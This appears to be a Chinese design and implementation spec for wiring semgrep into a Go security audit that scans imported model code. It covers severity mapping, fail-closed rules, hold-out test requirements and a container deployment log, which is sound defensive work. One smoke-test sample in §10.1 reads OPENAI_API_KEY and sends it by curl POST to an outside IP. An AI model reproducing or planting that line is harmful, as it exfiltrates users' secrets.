- **【新增】finding 排序后再截断。** semgrep 不承诺 `results` 的顺序，而 `MaxFindings` 保留的是前 N 条——顺序不稳会让截断扫描每次留下不同的集合，报告之间不再可比。`semgrepEngine` 按 `(File, Line, RuleID)` 稳定排序后再截断（`TestSemgrepEngineOrdersFindingsDeterministically`，载荷刻意逆序）。
  另注：截断后 `Passed` 由 `buildReport` 从**截断后的集合**算出，与 regex 臂同样有「截断即静默放行」的问题（§3.5）。两臂语义保持相同，不在适配器里单方面修——该由 §8 的 fail-closed 管线在**两臂之上**统一处理，否则两臂分叉。

- **【新增，硬性】上下文构造必须与 regex 臂等价。** `Finding.ContextBefore`/`ContextAfter`（生产侧对应 `GoFinding` 的同名字段，经 `teellm.FindingPayload` 送达 LLM）的取值方式，是本项目**唯一已实测出「引擎更换导致判定变化」的通路**（§3.2.2：`B3-04`/`B3-09` 的裁决因上下文形态从 `SUSPICIOUS` 翻为 `MALICIOUS`）。
  **实施要求**：
  1. `semgrepEngine` **不得**在未经验证的情况下把 AST 作用域块塞进 `CPGEvidence` 或 `ContextBefore`——尽管目标态架构（2026-09-17 §3）正是这么设想的，且 `CPGEvidence` 确实是被 `verifier.go:48-51` 用于覆盖 `ContextAfter` 的现成注入点。
  2. 正确做法是**先让两臂的上下文等价**（用同一套 ±N 行窗口构造），把 AST 切片的引入**作为接入之后的独立变更**，各自走留出集。
  3. 该等价性须有**测试守住**：同一份输入文件上，`regexEngine` 与 `semgrepEngine` 产出的 finding 在 `ContextBefore`/`ContextAfter` 上逐字节相同。
  > 理由：D1 的价值（§2.2）来自**能力前置**，而能力兑现发生在**接入之后**的规则演进里。接入这一刻要的是**行为中性**（§2.1），所以不能同时引入上下文形态的改变——那会把「换引擎」和「换证据形态」两件事捆在一起，正是主基准 §7.1 已声明无法归因的那个捆包。

### 6.5 配置与 fail-fast

沿用 `config.go:197-207` 对 `llm.policy` 已建立的模式（白名单 + load 期报错），新增引擎选择项：

```go
var staticEngines = []string{"regex", "semgrep"}

// 未识别的引擎名必须在配置加载期报错，而不是静默退回 regex：
// 静默退回会让「以为开了 semgrep」的部署实际跑 regex，且报告里的
// engine 字段还会诚实地写着 regex —— 没人会去看它。
```

**刻意不设默认值偏移**：接入完成前默认仍为 `regex`；切换默认引擎是 §9 留出集通过**之后**的独立动作。

#### 6.5.1 实现（2026-09-23）

配置键（`security` 段，与既有 `security.codeScan`/`security.scan` 同级）：

| 键 | 取值 | 默认 | 语义 |
|---|---|---|---|
| `security.codeScanEngine` | `regex` / `semgrep` | `regex` | Tier 1 引擎。**未识别值在 `LoadStartupConfig` 报错**（与 `llm.policy` 同一模式，含大小写与空白归一化） |
| `security.semgrepRulesPath` | 路径 | 空 | semgrep 的 `--config`。**空 = 用 `codeaudit.DefaultSemgrepRulesPath`**，该字面量只在 codeaudit 里写一次 |

`internal/config` 不 import `internal/codeaudit`（保持 config 为叶子包），故引擎名白名单在 config 内重复一份并注明来源——与既有 `llmPolicies` 注释同一处理。

**解析点在启动期，不在导入路径**：`buildSecurityConfig` 调用 `codeaudit.NewEngine(EngineConfig{...})`，把名字解析成引擎对象存进 `controller.SecurityConfig.Engine`；解析失败**直接终止启动**（`buildSecurityConfig` 因此改为返回 `(SecurityConfig, error)`）。理由：`codeScanEngine: semgrep` 配错时的两种表现都不是「扫描失败」而是「看起来像扫描器正常工作」——回退到 regex 时报告诚实地写着 `regex`（没人看），规则文件缺失时每次导入都被阻断并**物理删除模型代码**（与真检出恶意模型不可区分）。放到启动期，两者都变成一条能读的启动错误。

**`NewEngine` 因此校验规则路径存在**（`os.Stat`，接受文件或目录）。这是对 §6.5 原文的**扩展**：原文只要求校验名字。理由同上——`semgrepRulesPath` 是本次新增的部署输入，若不在这里校验就无人校验。**未校验 semgrep 可执行文件是否存在**：那是镜像构建问题，由阶段 G 的容器内复跑（§9.2 要求 10）覆盖。

**不静默回退**：`NewEngine` 对未识别名字（含空串）返回 error 而非 regex；`GenerateAuditReport`/`CheckImport`/`CheckImportWithLLM` 显式拒绝 `nil` 引擎（fail-closed，不 panic）。三者均新增 `engine StaticEngine` 形参——引擎选择只有一条路径，`DefaultEngine()` 仍返回 regex 基线，并有测试钉住「默认与选择器一致」。

> ⚠️ **阶段 G 必须注意**：`deploy-docker.sh` 的清理步骤执行 `rm -rf "$CONTAINER_WORKDIR/models"/*`。若把规则文件放进 `/root/taa/models/audit/semgrep/...`（即 `DefaultSemgrepRulesPath` 在容器内的落点），它会被清理步骤删掉，随后每次导入都因规则缺失而阻断。阶段 G 须把规则放在**该清理不会触及的路径**并显式设置 `security.semgrepRulesPath`，或确认清理步骤不覆盖它。这正是上面「启动期校验」要挡住的形态。

---

## 7. 严重度映射（本规范的核心，不许只写规则映射）

### 7.1 现行映射，以及它为什么是巧合

评测侧 `semgrep_runner.py:25-30`：

```python
SEVERITY_MAP = {"ERROR": "HIGH", "WARNING": "MEDIUM", "INFO": "LOW", "CRITICAL": "CRITICAL"}
```

实测当前 13 条规则的分布：

| semgrep | 条数 | 规则族 | 生产 Go |
|---|---|---|---|
| `ERROR` | 9 | CMD_001 NET_001 NET_002 OBF_001 EXF_001 PER_001 EMB_001 EMB_002 EMB_004 | 全为 HIGH ✅ |
| `WARNING` | 4 | DYN_001 FIL_001 ENV_001 EMB_003 | 全为 MEDIUM ✅ |

**9/9 与 4/4 精确吻合，但这只是当前规则集的巧合，不是不变量。** 一旦新增一条规则、或某个规则的严重度被改动，朴素映射就会静默漂移。

### 7.2 一处必须点名的缺陷：未知严重度默认 MEDIUM

`semgrep_runner.py:71`：`severity = self.SEVERITY_MAP.get(raw_sev, "MEDIUM")`。

**未知严重度静默变 MEDIUM，在 `assist` 下就是「不拦截」。** 这与本项目已经修过的失效模式（「扫描异常导致的无结果」被当作「代码安全放行」）同类：一个未知状态读成了「还好」。

**生产 Go 侧必须改为 fail-fast**：认不出的 severity 不得默认到某一档，应使该 finding 以 `UNCERTAIN` 进入 fail-closed（§8），或直接判扫描失败。评测侧的口径本轮**不改**（改了就使已完成的 6 轮不可比），登记为后续项。

### 7.3 目标态 §5 与生产 Go 在三条规则上冲突

| 规则 | 目标态 §5 | 生产 Go | 冲突 |
|---|---|---|---|
| `DYN_001` | HIGH | **MEDIUM** | 目标态更高 |
| `FIL_001` | HIGH | **MEDIUM** | 目标态更高 |
| `EXF_001` | **CRITICAL** | **HIGH** | 目标态引入生产不存在的等级 |

`rules.go:9-10` 只定义 `SeverityHigh`、`SeverityMedium`；`audit.go:242` 处理 `"LOW"`；**全链路没有 `CRITICAL` 的静态规则**。

**裁决：接入采用「生产 Go 的严重度」= 基准验证过的镜像集。**

理由（这是本规范最重要的一条论证）：

1. 非劣性证据是在**镜像集**上取得的。改严重度会改变被测量的处理本身，**使已取得的证据立即失效**。
2. **后果比我初稿说的窄得多（2026-09-23 实测修正）**：静态严重度**只在无裁决或裁决为 `UNCERTAIN` 时才起作用**（§3.2.1）。实测 `audit-100` 六轮中 16 个 `UNCERTAIN` 发现**全部已是静态 HIGH**，且 `BENIGN` 裁决出现 0 次——因此把 `DYN_001`/`FIL_001` 由 MEDIUM 升为 HIGH，**在本语料上零影响**。它只在 **LLM 关闭或整体不可用**（全部 finding 走「无裁决」分支）时才产生实际后果。
   > ⚠️ 初稿此处写「`assist` 下被拦良性样本仅 6 个 / FPR 0.12，升 HIGH 会显著抬高它」，**两个数字都是错的**：实测 `assist` 下被拦良性样本为 **26（regex）/ 28（semgrep）**，FPR **0.52 / 0.56**；且 M3 全族在 `assist` 下 10/10 被拦（裁决覆盖所致）。见证据报告 §7.5、§7.13。**结论方向不变（仍应延后），但理由从「后果很大」改为「后果只在特定条件下出现，且证据会失效」。**
3. 目标态 §5 的严重度列**没有**任何证据支撑——它是设计意图，不是实测。

**因此**：目标态 §5 的严重度差异按**后续独立变更**处理，各自走 RED→GREEN→重跑留出集的完整流程。**不得夹带在本次接入里。**

### 7.4 finding 条数差异对门禁是中性的，但对成本不是

- **门禁中性**：`passed` 只看 `High == 0 && Medium == 0`（§3.2），是**存在性**判定。semgrep 每条匹配都报、regex 每行只报首条（`scanner.go:137` 的 `break`），条数不同**不改变门禁结果**。
- **成本非中性**：Phase 2 对 finding **逐条**调 LLM（`verifier.go:33-108`）。条数变多 → LLM 调用变多 → 成本线性上升。
- 证据侧的对齐是**集合级**的（逐文件比 `rule_id` 集合），不是**多重集级**的；`bypass_rate` 两臂同为 0.22（存在性一致），`per_sample_llm_sec` 两臂 ≈1.0×。**on `audit-100` 条数大致相当，但这未在真实模型代码上验证。**

**实施要求**：`MaxFindings` 截断（§3.5）在 semgrep 下会**更容易触发**，因为条数更多。截断必须置 `Truncated = true` 并走 fail-closed，不得静默。

### 7.5 `verifier.go` / `audit.go` 的 gate 分歧必须收敛——**但不得抹掉第二道门的静态兜底**（2026-09-23 实测修正）

§3.3 的三处 `Passed` 赋值语义不一致，这是真缺陷。但初稿的处置建议（「统一到 `audit.go` 的语义」）**是错的，会导致真实漏报**。实测推翻如下。

**`Report.Passed` 不是多余的，它在救漏报。** 终判是 `Conclusion.Passed && Report.Passed`，而 `Report.Passed` 按**原始静态严重度**计算（`recalculateStaticPassed`，`verifier.go:232-246`）。当 LLM 把一个**静态 HIGH** 降级成 `SUSPICIOUS`（分类为 MEDIUM）时：

| 通道 | 结果 |
|---|---|
| `conclusion`（`assist`，只拦**分类后**的 HIGH） | **放行** → 该轮召回仅 0.94–0.98 |
| `report`（**原始静态** HIGH 计数） | **拦截** → 终判召回回到 **1.0000** |

实测被它救回的样本，六轮合计 **15 例，全部为恶意**（`M5-10`、`M5-05`、`M1-01`、`M1-06` 等；逐轮清单见证据报告 §7.5）。**若按初稿把 `recalculateStaticPassed` 改成委托给 `audit.go` 的 `assist` 判定（只拦分类后 HIGH），这 15 例即变成真实漏报。**

**因此正确的收敛方向是：**

1. **先承认三处不等价是「两种不同的问题」，不是同一个问题的三种写法。** `recalculateStaticPassed` 问的是「**原始静态**有没有 HIGH」——这是**独立于 LLM 的一道兜底**；`audit.go` 的 `gate`/`assist` 问的是「**LLM 分类后**有没有 HIGH/MEDIUM」。两者**都对**，且**都要保留**。
2. **要收敛的是 `recalculatePassed` 与 `audit.go` 的 `gate` 分歧**（同一个字符串 `"gate"` 在一个包里有两种含义）——让它接受 `policy` 参数并委托给 `audit.go` 的同一函数。
3. **`recalculateStaticPassed` 不动**，但必须**改名并加注释**说明它按原始静态严重度计算、是 LLM 降级的兜底，使「它和 gate 不一样」是**写明的设计**而非**看起来像 bug 的不一致**。同时须有测试固定上表 15 例的行为。
4. **明确终判语义**：`final = conclusion(policy) && staticFallback`。两个都要，缺一不可。

> ⚠️ **这条修正的来历**：初稿按「三处不一致 → 统一」的直觉给出建议，**没有验证第二道门是否在起作用**。本项目在严重度语义上已因「按直觉推断而非读实际执行」错过三次（证据报告 §7.5 勘误三），这是同一错误的第四次、只是方向相反（前三次低估了 LLM 裁决的作用，这次低估了静态兜底的作用）。**故实施阶段 A 的第一件事不是改代码，是先把上表 15 例写成表驱动测试并用它守住重构。**

---

## 8. Fail-closed 契约的落地（D2）

### 8.1 通道：复用 `ConclusionContext.ScanPassed`

`audit.go:293-295` 的 `ScanPassed` 是现成的、**两种策略下都生效**的强制失败通道。接入后的映射：

```
semgrep 未安装 / 非零退出 / 超时 / 解析错误 / 命中数截断
        → Report.ScanComplete = false
        → AssembleAuditReport 取 s := scanReport.Passed; ScanPassed = &s
        → ComputeConclusionContext: passed = false
        → import_processing.go:645 取 Conclusion.Passed = false → 阻断 + 清除模型代码
```

已核实的既有同类先例：`import_processing.go:623-630` 在 LLM 不可用时**直接判失败并清除已解压模型代码**，不降级为纯静态放行。D2 与它一致。

### 8.2 与目标态 §8.1 的差异必须写清

目标态 §8.1 把四条前置条件挂在「**50%+ 极速旁路放行**」上——即「零 finding 才能旁路 LLM」。生产确实有这个旁路（`verifier.go:306` 的 `len(scanReport.Findings) > 0`，零 finding 时不调 LLM），但**它从未被描述成一条契约，也没有任何前置条件**。

**本规范把 §8.1 的四条前置条件落到这个已有的旁路上**，而不新造一条旁路。即：只有 `ScanComplete && !Truncated && ParserErrors == 0 && UnsupportedExts == 0 && ProcessExitCode == 0` 时，才允许「零 finding → 直接放行」；否则一律 `passed = false`。

> **与 §8.1 的字面差异及调和（2026-09-23 实现后补）**：§8.1 把「命中数截断」列为五类失败之一并写成 `ScanComplete = false`，而本条的四项前置条件不含 `Truncated`。两者不该靠改 `ScanComplete` 来统一——`ScanComplete` 回答「引擎是否跑完」，截断回答「丢弃了什么」，是两个事实，让前者谎报后者会让报告在事后无法区分「没跑完」和「跑完了但丢东西」。故实现为一个统一谓词 `Report.ProvesCleanScan()`，五项各自独立**且**关系，任一为假即不成立；`ScanComplete` 保持其本义。两处字面差异由此消解，谓词定义见 `rules.go`。

### 8.3 **实现该契约时实测到的陷阱**：`ScanComplete` 的零值会让「最宽松的 fixture」变成「阻断一切」（2026-09-23）

**现象**：谓词折叠进 `recomputeReportPassed` 与 `AssembleAuditReport` 后，门控套件的 `final` 两臂 **FPR 从 0.52/0.56 跳到 1.0000、recall 1.0000**——即全部样本被阻断；`production-gate-semantics.json` 被改写。

**根因**：`gate_semantics_production_test.go` 刻意用裸字面量 `&Report{Findings: all}` 作为「**每个策略下最宽松的取值**」，其注释给出的理由是「fail-closed 分支只能把它置 false」。该理由**依赖零值无害**——而 `ScanComplete` 的零值是 false，其含义恰是「未完成」，于是最宽松的 fixture 变成了最严苛的：所有样本被判定阻断，且报告仍写着「未发现安全问题」，读起来像一个合理的结论。

**这不是测试笔误，是接入前就该预见的性质**：任何一个「零值即失败」的安全字段，都会把所有**绕过引擎 stamp 的构造路径**变成 100% 阻断。已在生产侧核实**当前不存在**这样的路径（`DefaultEngine()` 是唯一构造点，`engine.go:90`，两个引擎都 stamp；`NewScanner`/`NewDefaultScanner` 在非测试代码中无调用）。但该性质必须显式守住，故新增：

- `TestEveryEngineProvesACleanScanForANormalScan`：两个引擎对一次正常扫描的产出都必须 `ProvesCleanScan()`。故意移除任一引擎的 `stamp` 会精确报出 `ScanComplete=false ...`。**这是新增引擎或新增构造路径时的第一道警报。**
- 反向的 `TestRecomputeReportPassedWithholdsPassForAnIncompleteScan` 与 `TestProvesCleanScanRequiresEveryCompletenessField`，防止「永远失败」也能满足上述断言。

**判据留痕**：修复后门控两臂数值**逐字回到** `regex-run1 final: gate FPR=0.5600 recall=1.0000 | assist FPR=0.5200 recall=1.0000`，且 `production-gate-semantics.json` 与已提交版本**字节相同**。这同时证明了**该前置条件对「完整扫描」是判定中性的**——即它不改变任何既有结论，只在扫描不完整时生效。语料平价亦仍为 100/100 零分歧。

**连带修正的 fixture**：4 个测试文件中的裸 `Report` 字面量（`gate_semantics_production_test.go`、`gate_semantics_test.go`、`audit_test.go`、`llm_test.go`）补上 `ScanComplete: true` 并注明理由。**断言语义一处未改**，只补全了 fixture 对「这是引擎盖章过的完整扫描」的建模。

### 8.4 `UNCERTAIN` 的方向性（沿用证据侧结论）

证据报告 §7.7：`UNCERTAIN ≠ BENIGN`，所以 fail-closed 后静态命中**保留**，从不被开脱。生产侧同一性质由 `verifier.go:121` 与 `:143` 保证（只有 `VerdictBenign` 才算开脱）。**接入不得改变这一点**——semgrep 的 `dataflow_trace` 只增强证据，不改变裁决语义。

---

## 9. 证据门槛：留出集规格（D3）

**在留出集通过之前，默认引擎不得切到 semgrep。**

### 9.1 为什么必须新建

证据报告 §7.2 已写明：`audit-100` 是**拟合集**——P0-bis 的规则对齐以它和 59 条 fixture 为参照做的，`EMB_001` 的过报也是由它的全量审计抓出并修掉的。**规则移植的漏报恰恰只在未见构造上暴露。**

### 9.2 留出集要求（硬性）

| # | 要求 | 理由 |
|---|---|---|
| 1 | **独立来源**：样本不得由本次规则的作者构造，不得复用 `FAMILY_SPECS`/`PROJECT_ALLOCATION` 的生成参数 | 避免重演 `audit-100` 的拟合 |
| 2 | **对抗构造优先**：别名（`import socket as s`）、解构重命名、跨行流转、动态 `getattr`/`importlib` | 正是目标态 §2 列出的 regex 四大盲区 |
| 3 | **标注口径与 `audit-100` 一致**（`expected_severity`、`ground truth` 主攻击规则） | 使判定规则可复用 |
| 4 | **规模**：良性/恶意各不少于 50 | `ΔFPR` 最小可分辨步长 0.02，与主基准对齐 |
| 5 | **判定规则沿用 0 容差**：`ΔFPR ≤ 0` 且 `Δrecall ≥ 0`，逐对成立 | 证据 spec §5.3 已定，不放松 |
| 6 | **两臂同测**（regex 与 semgrep），3 轮配对 | 单臂无法归因 |
| 7 | **【新增，硬性】在 `assist` 下判定**（生产默认策略），并**同时**报告 `gate` 下的数值 | 见 §3.2.2：主基准用 `gate` 判定，而 `gate` 对裁决失明；同一份数据在 `assist` 下给出**相反**结论（ΔFPR 0 → +0.04）。**用 `gate` 判定即为测量仪器选错** |
| 8 | **【新增，硬性】逐样本比对两臂送给 LLM 的 Prompt 内容等价性**（`context_before`/`context_after`/`cpg_evidence`/`ast_enclosing_block` → `ContextBefore`/`ContextAfter`/`CPGEvidence`） | 主基准里两臂唯一的实质差异就在这里（`B3-04`/`B3-09`，见 §3.2.2）。若留出集只比判定、不比 Prompt，同一个成因会**再次**以「判定差异」的形式出现而无从归因 |
| 9 | **【新增，硬性】先证明「regex 臂 == 生产 Go 引擎」**：留出集上跑 `TAA_CORPUS_PARITY` 式的逐样本 `(rule_id, severity, line)` 比对，两臂**零分歧**方可开始判定 | §3.6 实测：主基准的这个前提**修复前不成立**（92/100）。两份规则表各自维护、会漂移；不先证等价，`ΔFPR` 比较的可能是两个不同的基线。**须在留出集上重做一次**，不能沿用主基准的结论 |
| 10 | **【阶段 D 已完成，2026-09-23】适配器的判据须在留出集/容器上复现**：`errors` 非空、`paths.scanned` 未覆盖全部 target、退出码非 0、输出不可解析——四项在宿主上已用桩测守住（§6.4），但**真实 CLI 行为只在本机 1.177.0 上验过**。阶段 G 须在镜像内对同一版本复跑集成测试（`go test -run Semgrep`），并把版本号记入部署产物 | 若镜像内的 semgrep 版本与宿主不同，`errors`/`paths.scanned` 的填充行为可能不同，而这两个字段是 fail-closed 的唯一依据（§8）。「宿主上过了」不等于「容器里过了」——本项目的证据纪律要求这条边界显式记录 |

### 9.3 留出集必须额外覆盖的两项（`audit-100` 没覆盖）

1. **扫描与 LLM 同时受载**（§5.1 第 4 条）：串行的 6 轮矩阵**没有**覆盖这个组合，而它正是实测两次失效的场景。
2. **大目录/大文件**：`audit-100` 是小型合成样本（4.3 s/样本）。真实模型代码的扫描时长与内存占用未测量，直接外推是**不成立的**；`MaxFindings` 截断（§3.5、§7.4）也只在真实规模上才会被触发。

### 9.4 判定的两种合法措辞

- 留出集**通过** → 允许把默认引擎切到 semgrep（§6.5），进入灰度。
- 留出集**未通过** → 回到规则对齐循环；**不得**因为「主基准已通过」而放宽。

> **「通过」的定义已按 §3.2.2 收紧**：必须在 **`assist`（生产默认策略）** 下逐对满足 `ΔFPR ≤ 0` 且 `Δrecall ≥ 0`，并在报告里同时给出 `gate` 下的数值。**只报 `gate` 下的通过不算通过**——主基准正是这么做的，而它在 `assist` 下的结论相反。这条收紧是本规范从主基准的实测里学到的，不是预防性条款。

---

## 10. 分阶段实施（TDD）

**实施顺序由用户于 2026-09-23 指定**：先在**本地**把 semgrep 接进 Go 代码，再用 `deploy-docker.sh` 把 **taa + semgrep 一起**部署进容器做测试。因此本表把「容器部署」排在代码接入**之后**，`§4` 的部署子决策也随之确定为 **装进镜像**（选项 a）。

每阶段 RED → 验证 RED 原因 → GREEN → 验证 GREEN → REFACTOR。测试落 `tests/`（Python 侧）与 `internal/codeaudit/*_test.go`（Go 侧）。**每阶段独立可回滚。**

| 阶段 | 内容 | 产出 | 风险 |
|---|---|---|---|
| **A** | **先**把证据报告 §7.5 的 15 例「静态兜底救回」写成表驱动测试，**再**收敛 `verifier.go`/`audit.go` 的 gate 语义（§7.5） | 兜底行为被测试固定 + `recalculatePassed` 委托给 `audit.go`；`recalculateStaticPassed` 只改名加注释、不改语义 | 低，纯 Go；**但顺序不能反**（先改会丢 15 例） |
| **B** | `StaticEngine` 抽象 + `regexEngine` 包装（§6.1） | 行为**零变化**，全测试绿 | 低，纯重构 |
| **C** | `Report`/`Finding` 字段扩展 + `MaxFindings` 截断标志（§3.5、§6.2） | 截断不再静默 | 中，触及判定输入 |
| **D** | `semgrepEngine` 实现（§6.4）：exec、解析、`metadata.rule_family` 映射、**上下文构造与 regex 臂等价**（§6.4 新增要求） | **本地**可跑（宿主已有 semgrep 1.177.0，无需容器）；含「两臂上下文逐字节相同」的测试 | 中 |
| **E** | fail-closed 管线（§8）：**把 D 已能检出的失败接到判定上** | 统一谓词 `ProvesCleanScan()` + 两个判定点（`AssembleAuditReport`、`recomputeReportPassed`、`CheckImport`、`CheckImportWithLLM`）接线；`failclosed_test.go` 七例；四类适配器级失败已在阶段 D 覆盖 | **高，这是安全属性**；实测踩到零值陷阱（§8.3），fixture 建模已连带修正 |
| **F** | 配置项 + fail-fast（§6.5） | `security.codeScanEngine` + `security.semgrepRulesPath`；未识别名字在 load 期报错；引擎在启动期解析进 `SecurityConfig.Engine`，解析失败终止启动；`NewEngine` 为唯一「名字→引擎」路径 | 低 |
| **G** | **容器部署与功能验证**：`deploy-docker.sh` 装 taa + semgrep + 规则文件，容器内跑通；顺带做同容器并发压测（为 D4 取证） | 容器内可跑 semgrep，审计链路端到端可用；**规则文件路径须避开 `deploy-docker.sh` 对 `models/*` 的清理**（§6.5.1 警告）。**已完成，见 §10.1** | 中 |
| **H** | 留出集非劣验证（§9）：**在 `assist` 下判定**，并比对两臂 Prompt 等价性 | 通过才允许切默认引擎 | — |

**阶段 G 与阶段 H 是两件事，不得混同**：

- **G 是功能验证**（smoke）：证明「容器里能跑通」，**不产生任何证据**，结论不得被引用为「非劣」。
- **H 是证据门槛**（D3）：必须按 §9 的规格建留出集，判定沿用 0 容差。**G 通过不等于 H 通过。**

**阶段 D 在本地测**是这次顺序安排的关键好处：宿主已有 semgrep 1.177.0，接口与解析逻辑可以完全不依赖容器先跑通并测透，容器只用来验证部署与真实环境集成。

**阶段 E 的 RED 必须是「注入失败 → 断言阻断」而非「断言计数」**：本项目的先例是 P2 的 fail-open 守卫测试（「构造 `findings == []` 且 `scan_complete is False`，断言不计为 TN」）。同类测试在 Go 侧必须有**五条**（未安装、非零退出、超时、解析错误、截断）。

> **阶段 D 落地后对本条的修订（2026-09-23）**：五类失败中**前四类已在适配器内检出**——`semgrepEngine` 对「进程起不来 / 退出码非 0 / 输出不可解析 / `errors` 非空或 `paths.scanned` 未覆盖全部 target」一律返回 error 且**不返回报告**（§6.4，桩测已覆盖）。第五类（截断）仍**未**接到判定上：`buildReport` 在两臂都从截断后的集合算 `Passed`（§3.5）。
> 因此**阶段 E 的范围收窄为「接线 + 截断」**：验证 `GenerateAuditReport`/`CheckImport` 在适配器返回 error 时确实阻断（含 HTTP 层的响应），并把截断接到 fail-closed 上——**且必须在两臂之上统一处理**，否则两臂分叉。原「五条注入测试」的要求不变，只是前四条的注入点从管线移到了适配器的 `execFn`，测试已存在于 `semgrep_engine_test.go`。

**阶段 G 须顺带压测同容器并发**：在容器内制造「semgrep 扫描与 LLM 调用同时受载」，观测 LLM 是否被饿死（判据是逐样本 `llm_state` 与调用耗时，**不是**容器存活——见证据报告 §7.6）。**该压测的用途已由 D4 改变**：不再用于裁决「是否接受风险」（D4 已从拓扑上关闭，§5.0），而是为「**正式部署必须分离 LLM**」取得直接证据。

---

### 10.1 阶段 G 实施记录（2026-09-23）

**结论先行**：部署与容器内功能验证**通过**（G-1、G-2）；同容器并发压测（G-3）在本语料、本负载下**未观察到推理失效**，但**观察到 LLM 延迟随并发稳定抬升**（空闲 0.3 s → 4 并发 5.4 s → 8 并发 9.9 s → 12 并发 11.0 s），即**推理没有被饿死，但被拖慢了约 30 倍**。**这不构成放松 D4 的理由**：§5.0 已声明「一次负载下的观测不能推翻两次既有实测」，且 G-3 的负载远小于真实失败场景（语料 1.18 MB / 400 文件，`--max-memory 1024` 从未被触到）。**D4 的分离式部署照旧。**

#### G-1 容器部署（`deploy-docker.sh --scan-engine semgrep`）

| 项 | 值 |
|---|---|
| 镜像 | `taa-env:slim-v2-semgrep-20260923-1016`（id `4d93996f20d6`）。体积只引用**打包脚本自身**的输出 `6094.16 MB`；`docker images` 同镜像报 `13.8 GB`，两者口径不同，本记录不混用 |
| 归档 | `deploy/taa-env-slim-v2-semgrep-20260923-1016.tar.gz`（**4.8 G**，脚本输出；`.gitignore` 已覆盖 `*.tar.gz`） |
| semgrep | 1.177.0 —— **从 CLI 回读**，非仅信任 `pip install` 的 pin（回读失败即 `die`） |
| 依赖树 | `/opt/taa/semgrep/pip-freeze.txt`（125 行）。pin 住 semgrep **不等于** pin 住它拉进来的东西 |
| 规则落盘 | `/opt/taa/semgrep/rules/{python,go,shell}/rules.yaml` |
| 规则指纹 | `/opt/taa/semgrep/MANIFEST` 三条 sha256 与仓库 `git ls-files` 的三个文件**逐字节相同**：python `ff0c7cb8…`、go `a19b4cab…`、shell `cbf792a0…` |
| 容器配置 | `security.codeScanEngine="semgrep"`、`security.semgrepRulesPath=/opt/taa/semgrep/rules/python/rules.yaml` |

**三条实施要点（均为本阶段新增，写进 `deploy-docker.sh`）**：

1. **规则路径避开清理步骤**（§6.5.1 警告的落实）：落在 `/opt/taa/semgrep`，不在 `models/`、也不在 `/tmp` —— 第 6 步的清理会清空这两处。同一位置在清理后存活，故「装 semgrep」可以排在 TAA 部署**之前**。
2. **引擎经宿主派生模板传入**：`write_taa_config` 把 `security` 段**逐字复制**，所以引擎必须在 TAA 启动前就写进模板，否则要二次重启才能生效。派生模板经 `TAA_DOCKER_CONFIG_TEMPLATE` 只传给那一次 `deploy.sh` 调用；**仓库内模板 `configs/taa-docker.json` / `taa-production.json` 不含 engine 键**（已核：`grep -c` 均为 0），因此**打包不会移动生产默认引擎**。
3. **`--scan-engine` 的取值在打包脚本内先校验**：未识别名字若留给守护进程，报错发生在**镜像内、守护进程已停之后**；放在脚本里就是操作者当场能看到的一行。

**镜像自检**（对提交后的镜像另起容器核对，非对开发容器）：`/root/taa/verify` **不存在**（G-3 的脚手架**未进入镜像**）、`/root/taa/models` 为空、`semgrep --version` = 1.177.0、`security.codeScanEngine = "semgrep"`。

> 这也顺带关闭了**两处**遗留口子：§6.5.1 的「**未校验 semgrep 可执行文件是否存在**」，以及 **§9.2 要求 10**（「阶段 G 须在镜像内对同一版本复跑集成测试，并把版本号记入部署产物」——镜像内 `go test -run Semgrep` 已复跑，版本号已记入 `MANIFEST` 第一行）。

#### G-2 容器内功能验证（smoke；**不产生证据**）

按 §10 开头的声明，以下**只证明「容器里能跑通」**，不得被引用为「非劣」。

| # | 检查 | 结果 |
|---|---|---|
| 1 | 适配器自测（镜像内跑宿主编译的 `codeaudit.test -test.run Semgrep`，指向镜像自带的规则文件） | **PASS**（exit 0） |
| 2 | 干净模型 import 端到端 | `engine=semgrep … policy=assist, failClosed=true` → `审计完成: passed=true, riskLevel=NONE, totalFindings=0`（4 s） |
| 3 | 命中规则的模型 import 端到端 | 同一 `engine=semgrep` → `审计完成: passed=false, riskLevel=CRITICAL, totalFindings=2` → `模型安全审计未通过，清除模型状态`（54 s） |

**第 3 条是第 2 条非空洞的证明**：同一引擎、同一配置，只换 payload，即由放行转为阻断。该 payload 是

```python
api_key = os.environ.get("OPENAI_API_KEY")
subprocess.run(["curl", "-X", "POST", "http://198.51.100.7/collect", "-d", api_key])
```

命中两条规则、与静态严重度对得上：`ENV_001`（WARNING→MEDIUM）与 `CMD_001`（ERROR→HIGH，走 `subprocess.$FUNC($CMD, ...)` + `$CMD` 以 `curl` 起头的那一支）。**`EXF_001` 未命中**——它是 taint 规则，sink 只列了 `requests.*` / `socket.sendall`，而本例的外发走 `subprocess`，这是规则覆盖面的已知边界，不是本次接入引入的。

`riskLevel=CRITICAL` 只能来自 Tier 2 裁决（生产静态侧只有 HIGH/MEDIUM 两级，§7.3），故它同时证明 **`llmEnabled=true` 的 TEE-TLS 通路在容器内确实跑通了**，而非静态兜底单独生效。

> **证据来源的诚实记录**：首次运行该检查时，脚本的 `wait_for_audit "审计完成"` 匹配到了**上一个** import 的完成行，故该次运行的第三条断言**无效**。上表结论由 `taa.log` 中**带 `taskId` 的时间线**重新确立（`02:29:40` 起、`02:30:34` 完成、`taskId=g3-task-bad`），不是由脚本当时的打印确立。

#### G-3 同容器并发压测（D4 取证）

**方法**：容器内持续施加 semgrep 扫描负载（适配器同一条命令行），同时以**审计所用同一模型、同一 `keep_alive`、同 `num_predict`** 打 LLM 探针，**探针超时取生产值 30 s**（与 `llm.requestTimeoutMs` 一致），故「探针 ok」＝「审计里那次调用也会成功」。负载**跨整轮探针持续**（一轮扫完立刻起下一轮），因为本语料单次扫描仅约 5 s：若只在开头打一次探针，余下探针量到的是空闲 LLM，什么也证明不了。

**脚本已入库**：`models/audit/tools/semgrep_press_test.sh`（在容器内运行；语料为 `audit-100` 的 400 个 `.py`，1.18 MB，落在 `/root/taa/verify/bench`）。该脚本**不参与产品构建**，存在的理由只有一个——让这里的数字可被重跑复核。脚本带单实例守卫：第一次运行时我杀掉的是宿主侧的 `docker exec` 客户端，容器内的进程仍在写同一个探针日志，两个负载混进了同一份证据，该轮已整轮作废重跑。

**逐样本记录**（每行都带 `scans_active`，故每个样本自证其是否受载）：

| 负载 | 探针数 | 受载样本 | LLM 结果 | 延迟（均值 / 最小 / 最大） |
|---|---|---|---|---|
| 0 并发 | 10 | 0 | 10/10 ok，HTTP 200 | 0.3 s / 0.2 s / 0.6 s |
